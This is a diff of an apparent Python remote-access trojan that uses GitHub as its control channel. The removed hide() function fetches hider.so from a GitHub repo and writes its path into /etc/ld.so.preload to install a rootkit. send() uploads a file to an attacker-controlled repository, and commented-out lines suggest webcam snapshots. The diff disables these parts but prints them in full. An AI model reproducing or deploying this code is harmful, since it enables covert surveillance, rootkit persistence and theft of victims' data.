@@ -35,11 +35,6 @@ def load_module(name):
 	sys.modules[name] = module
 	return module
 
-def hide():
-	urllib.urlretrieve('https://raw.github.com/mehdi-desu/projet_impossible/master/modules/hider.so','/usr/local/lib/hider.so') 
- 	f = open('/etc/ld.so.preload','w')
-	f.write("/usr/local/lib/hider.so")
-	f.close()
 
 def send():
 	gh,repo,branch = connect_to_github()
@@ -47,10 +42,9 @@ def send():
 #	repo.create_file("data/mrbean64.jpeg","add a file",base64.b64encode(f.read()))
 	repo.create_file("data/mrbean.jpeg","add a file",f.read())
 
-send()
-#hide()
+#send()
 #cam = load_module("cam")
-#while True:
+while True:
 #	cam.snap()
-#	print "ddd"
-#	time.sleep(1)
+	print "ddd"
+	time.sleep(1)
